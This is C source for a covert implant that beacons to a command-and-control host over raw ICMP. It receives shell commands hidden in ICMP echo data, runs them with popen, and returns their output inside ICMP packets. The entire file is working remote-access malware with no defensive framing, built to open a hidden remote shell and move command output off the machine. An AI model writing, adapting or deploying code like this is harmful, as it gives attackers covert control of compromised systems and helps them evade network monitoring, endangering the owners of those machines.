#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include "../include/implant.h"

// creates a raw ICMP socket and binds it
int create_socket(void) {
    int sockfd;

    // create the raw ICMP socket
    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket()");
        exit(-1);
    }

    return sockfd;
}

// calculates checksum (proudly? stolen from the internet)
unsigned short cksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
      sum += *w++;
      nleft -= 2;
    }

    if (nleft == 1) {
      *(unsigned char *)(&answer) = *(unsigned char *)w;
      sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    
    return answer;
}

// runs the command from the C2 and returns the output
char *invoke_command(char *data) {
    FILE *ptr;
    size_t init_size = BUFFER_SIZE;
    char *temp_buffer = (char *) calloc(init_size, 1);
    char *buffer;
    char *command;

    data[strlen(data)-1] = '\0'; // strip the newline

    command = strcat(data, " 2>&1"); // redirect stderr to stdout


    ptr = popen(command, "r");
    if (ptr == NULL) {
        perror("popen()");
        return NULL;
    }

    fread(temp_buffer, 1, BUFFER_SIZE, ptr);

    // if we haven't reached EOF or NULL byte, reallocate and continue re-read
    while (temp_buffer[strlen(temp_buffer)] != '\0') {
        init_size *= 2;
        temp_buffer = realloc(temp_buffer, init_size);
        fread(temp_buffer, 1, init_size, ptr);
    }

    buffer = calloc(strlen(temp_buffer), 1);
    
    strncpy(buffer, temp_buffer, strlen(temp_buffer));

    free(temp_buffer);
    pclose(ptr);

    return buffer;
}

// reads from the socket and put it in the buffer
int read_from_socket(int sockfd, char *buffer, int size) {
    int bytes_num = read(sockfd, buffer, size);

    if (bytes_num < 0) {
        perror("read()");
        return 0;
    }

    return 1;
}

// sends a beacon to the C2
int send_beacon(int sockfd, char *dst_ip) {
    char *packet;
    struct icmphdr *icmp;
    int packet_size = sizeof(struct icmphdr *);
    int bytes_num;
    struct sockaddr_in dst;
    
    packet = (char *) malloc(packet_size);

    // setting the IP options
    dst.sin_family = AF_INET;
    inet_aton(dst_ip, &dst.sin_addr);

    // setting the ICMP options
    icmp = (struct icmphdr *) packet;
	icmp->type = 8;
	icmp->code = 8;
	icmp->un.echo.id = 9001;
    icmp->checksum = cksum((unsigned short *) icmp, packet_size);

    bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr), 0, (struct sockaddr *) &dst, sizeof(dst));
    if (bytes_num < 0) {
        perror("sendto()");
        free(packet);
        return -1;
    }
    free(packet);

    return 1;
}

// check if we got an actual connection from our C2
int check_magic_byte(struct icmphdr *icmp) {
    if (icmp->type == 8 && icmp->un.echo.id == 9001) {
        return 1;
    }
    return 0;
}

// prep'ing the ICMP headers & setting up the checksum
void prep_icmp_headers(struct icmphdr *icmp, char *data, uint16_t checksum) {
    icmp->checksum = 0; // needs to be set before calculating for some weird reason
    icmp->checksum = checksum;
    icmp->type = 0;
    icmp->un.echo.id = 9001;
}

/* TODO: return as raw bytes instead of chars for tty interaction */
// reuse the ICMP packet to append our input in the data section
void append_to_data_section(struct icmphdr *icmp, char *data, char *input) {
    memcpy((char *) data, input, strlen(input));

    uint16_t checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen(input));

    prep_icmp_headers(icmp, data, checksum);
}

// prep'ing the IP headers for later usage
struct sockaddr_in prep_ip_headers(struct iphdr *ip) {
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip->saddr;

    return addr;
}

/* TODO: return as raw bytes instead of chars for tty interaction */
// parse the data section
char *parse_data_section(char *packet) {
    // get the data section (ignoring the IP & ICMP headers )
    char *data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
    
    data[strlen(data)] = '\0';

    return data;
}

// the actual interaction occurs here
void interact(int sockfd, char *dest_ip) {
    struct iphdr *ip; // holds the IP header
    struct icmphdr *icmp; // holds the ICMP header
    char *data; // holds the ICMP's data section
    char *output; // holds the output of the command
    char *packet; // holds the packet
    struct sockaddr_in addr;
    size_t bytes_num, packet_size; 

    // calculating the packet size
    packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + BUFFER_SIZE;

    // allocating a buffer to store the recieved ICMP packet
    packet = (char *) malloc(packet_size);
    data = (char *) malloc(BUFFER_SIZE);

    if (packet == NULL || data == NULL) {
        fprintf(stdout, "Error: Cannot allocate memory\n");
        free(packet);
        free(data);
        close(sockfd);
    }

    while (1) {
        // send a beacon and wait for commands
        // gotta figure out how to better control it
        send_beacon(sockfd, dest_ip);

        if (!read_from_socket(sockfd, packet, packet_size)) {
            perror("read()");
            break;
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        // set the IP & ICMP headers for later usage
        addr = prep_ip_headers(ip);

        // get the data section
        data = parse_data_section(packet);

        // invoke the command
        output = invoke_command(data);
        
        // put the output in the data section of the ICMP packet
        append_to_data_section(icmp, data, output);    

        data = NULL;

        // send it
        bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(output), 0, (struct sockaddr *) &addr, sizeof(addr));
        if (bytes_num < 0) {
            perror("sendto()");
            break;
        }

        // clean up the packet & output buffers for reuse
        memset(packet, '\0', packet_size);

        free(output);
    }
  
    free(data);
    free(output);
    free(packet);
    close(sockfd);
}

// initializes the options and starts the implant
void implant_init_n_call(char *dest_ip) {
    int sockfd = create_socket();

    interact(sockfd, dest_ip);
}
